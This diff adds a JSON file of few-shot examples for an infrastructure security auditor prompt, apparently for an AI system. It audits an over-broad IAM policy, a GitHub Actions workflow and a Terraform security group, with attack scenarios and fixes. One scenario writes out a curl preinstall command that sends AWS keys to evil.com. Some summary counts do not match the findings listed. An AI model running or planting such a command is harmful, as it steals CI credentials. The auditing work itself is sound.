@@ -1,0 +1,107 @@
+{
+  "prompt_name": "Infrastructure Security Auditor",
+  "examples": [
+    {
+      "input": "Audit this IAM policy attached to our application's EC2 role:\n\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": \"*\",\n      \"Resource\": \"*\"\n    }\n  ]\n}",
+      "output": {
+        "executive_summary": {
+          "critical": 1,
+          "high": 1,
+          "medium": 1,
+          "overall_risk": "CRITICAL"
+        },
+        "findings": [
+          {
+            "id": "FINDING-001",
+            "title": "Full Administrator Access on EC2 Instance Role",
+            "severity": "CRITICAL",
+            "category": "IAM",
+            "cis_reference": "CIS AWS Foundations Benchmark 1.16 — Ensure IAM policies that allow full \"*:*\" administrative privileges are not attached",
+            "description": "The IAM policy grants unrestricted access to ALL AWS services and ALL resources in the account. This violates the principle of least privilege and gives any code running on this EC2 instance — including compromised dependencies, SSRF exploits, or malicious actors who gain access — full control over the entire AWS account.",
+            "attack_scenario": "1. Attacker discovers an SSRF vulnerability in the web application\n2. Attacker uses SSRF to reach the EC2 metadata endpoint (169.254.169.254)\n3. Attacker retrieves temporary credentials from the instance profile\n4. With Action:* Resource:*, attacker can: create admin IAM users, access all S3 data, launch crypto mining instances, delete all resources, exfiltrate all secrets from Secrets Manager\n5. Full account compromise in minutes",
+            "current_config": "{\n  \"Effect\": \"Allow\",\n  \"Action\": \"*\",\n  \"Resource\": \"*\"\n}",
+            "remediation": "Replace with a scoped policy that grants only the specific permissions the application needs:\n\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"S3AppBucket\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"s3:GetObject\",\n        \"s3:PutObject\",\n        \"s3:ListBucket\"\n      ],\n      \"Resource\": [\n        \"arn:aws:s3:::my-app-bucket\",\n        \"arn:aws:s3:::my-app-bucket/*\"\n      ]\n    },\n    {\n      \"Sid\": \"SQSQueues\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"sqs:SendMessage\",\n        \"sqs:ReceiveMessage\",\n        \"sqs:DeleteMessage\"\n      ],\n      \"Resource\": \"arn:aws:sqs:us-east-1:123456789012:my-app-queue\"\n    },\n    {\n      \"Sid\": \"CloudWatchLogs\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"logs:CreateLogStream\",\n        \"logs:PutLogEvents\"\n      ],\n      \"Resource\": \"arn:aws:logs:us-east-1:123456789012:log-group:/app/*\"\n    }\n  ]\n}\n\nProcess: 1. Enable CloudTrail and IAM Access Analyzer. 2. Run Access Analyzer policy generation to discover actually-used permissions. 3. Create a scoped policy based on actual usage. 4. Test in staging. 5. Apply to production. 6. Monitor for access denied errors for 2 weeks.",
+            "verification": "aws iam simulate-principal-policy --policy-source-arn <role-arn> --action-names ec2:RunInstances iam:CreateUser s3:DeleteBucket --query 'EvaluationResults[].{Action:EvalActionName,Decision:EvalDecision}'"
+          },
+          {
+            "id": "FINDING-002",
+            "title": "IMDSv2 Not Enforced on EC2 Instance",
+            "severity": "HIGH",
+            "category": "IAM",
+            "description": "If the EC2 instance doesn't enforce IMDSv2 (HttpTokens=required), the SSRF attack vector described in FINDING-001 becomes trivially exploitable. IMDSv1 allows simple GET requests to the metadata endpoint without any authentication token.",
+            "remediation": "aws ec2 modify-instance-metadata-options --instance-id <id> --http-tokens required --http-endpoint enabled --http-put-response-hop-limit 1"
+          }
+        ]
+      }
+    },
+    {
+      "input": "Review the security of this GitHub Actions workflow:\n\nname: Deploy\non:\n  pull_request_target:\n    types: [opened, synchronize]\njobs:\n  deploy-preview:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - run: npm install && npm run build\n      - run: npm run deploy-preview\n        env:\n          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}",
+      "output": {
+        "executive_summary": {
+          "critical": 1,
+          "high": 2,
+          "medium": 1,
+          "overall_risk": "CRITICAL"
+        },
+        "findings": [
+          {
+            "id": "FINDING-001",
+            "title": "Secret Exfiltration via pull_request_target with Untrusted Code Checkout",
+            "severity": "CRITICAL",
+            "category": "CI-CD",
+            "description": "This workflow uses pull_request_target (which has access to repository secrets) but checks out the PR author's code. Any external contributor can submit a PR that modifies package.json scripts, build commands, or adds malicious code that exfiltrates AWS credentials during npm install, npm run build, or npm run deploy-preview.",
+            "attack_scenario": "1. Attacker forks the repo and creates a PR\n2. Attacker modifies package.json 'preinstall' script: \"curl https://evil.com/steal?key=$AWS_ACCESS_KEY_ID&secret=$AWS_SECRET_ACCESS_KEY\"\n3. Workflow triggers automatically on PR open\n4. npm install runs the preinstall script with secrets in env\n5. Attacker has AWS credentials — full access to whatever those keys allow",
+            "remediation": "Split the workflow:\n\n1. Use 'pull_request' (not pull_request_target) for building and testing — no secrets access:\n\nname: CI\non: pull_request\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@<sha>\n      - run: npm ci && npm test\n\n2. Use a separate deployment workflow triggered only on main branch pushes:\n\nname: Deploy\non:\n  push:\n    branches: [main]\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n    steps:\n      - uses: actions/checkout@<sha>\n      - uses: aws-actions/configure-aws-credentials@v4\n        with:\n          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}\n          aws-region: us-east-1\n      - run: npm ci && npm run build && npm run deploy"
+          },
+          {
+            "id": "FINDING-002",
+            "title": "Static AWS Credentials Instead of OIDC Federation",
+            "severity": "HIGH",
+            "category": "IAM",
+            "description": "Using long-lived AWS access keys in GitHub Secrets. These keys don't expire, can't be scoped per-workflow, and if leaked provide persistent access.",
+            "remediation": "Switch to GitHub OIDC federation with AWS IAM. This provides short-lived, auto-rotating credentials scoped to specific repositories and branches. See aws-actions/configure-aws-credentials@v4 with role-to-assume."
+          },
+          {
+            "id": "FINDING-003",
+            "title": "Unpinned Action Versions",
+            "severity": "HIGH",
+            "category": "Supply Chain",
+            "description": "Using actions/checkout@v4 (tag) instead of a pinned SHA. Tags can be force-pushed to point to malicious code — a supply chain attack vector.",
+            "remediation": "Pin to full commit SHA: uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11"
+          }
+        ]
+      }
+    },
+    {
+      "input": "Audit this Terraform security group:\n\nresource \"aws_security_group\" \"app\" {\n  name = \"app-sg\"\n  vpc_id = aws_vpc.main.id\n\n  ingress {\n    from_port   = 22\n    to_port     = 22\n    protocol    = \"tcp\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n\n  ingress {\n    from_port   = 443\n    to_port     = 443\n    protocol    = \"tcp\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n\n  ingress {\n    from_port   = 3306\n    to_port     = 3306\n    protocol    = \"tcp\"\n    cidr_blocks = [\"10.0.0.0/8\"]\n  }\n\n  egress {\n    from_port   = 0\n    to_port     = 0\n    protocol    = \"-1\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n}",
+      "output": {
+        "executive_summary": {
+          "critical": 1,
+          "high": 1,
+          "medium": 2,
+          "overall_risk": "HIGH"
+        },
+        "findings": [
+          {
+            "id": "FINDING-001",
+            "title": "SSH (Port 22) Open to the Internet",
+            "severity": "CRITICAL",
+            "category": "Network",
+            "cis_reference": "CIS AWS 5.2 — Ensure no security groups allow ingress from 0.0.0.0/0 to port 22",
+            "description": "SSH access is open to the entire internet (0.0.0.0/0). This exposes the instance to brute-force attacks, exploitation of SSH vulnerabilities, and unauthorized access attempts from any IP address globally.",
+            "attack_scenario": "1. Attacker scans AWS IP ranges for port 22 (automated, trivial)\n2. Attempts brute-force SSH login with common credentials\n3. Or exploits known SSH vulnerabilities if the SSH server is not patched\n4. Gains shell access to the instance\n5. From there, can access the MySQL database on port 3306 (same SG), escalate via instance role, or pivot to other VPC resources",
+            "remediation": "Option A (preferred): Remove SSH ingress entirely. Use AWS Systems Manager Session Manager for shell access — no open ports needed:\n\ningress {\n  # REMOVED: port 22 from 0.0.0.0/0\n}\n\nOption B: Restrict to VPN CIDR or specific IPs:\n\ningress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = \"tcp\"\n  cidr_blocks = [var.vpn_cidr]  # e.g., \"10.100.0.0/24\"\n  description = \"SSH from VPN only\"\n}"
+          },
+          {
+            "id": "FINDING-002",
+            "title": "Database Port Accessible from Overly Broad CIDR",
+            "severity": "HIGH",
+            "category": "Network",
+            "description": "MySQL port 3306 is accessible from 10.0.0.0/8, which is a /8 network containing 16.7 million addresses. If this VPC uses a /16 CIDR, the rule should be scoped to that specific VPC CIDR, or better yet, restricted to specific security groups.",
+            "remediation": "Replace CIDR-based rule with security-group-based rule:\n\ningress {\n  from_port       = 3306\n  to_port         = 3306\n  protocol        = \"tcp\"\n  security_groups = [aws_security_group.app_servers.id]\n  description     = \"MySQL from app servers only\"\n}"
+          }
+        ]
+      }
+    }
+  ]
+}
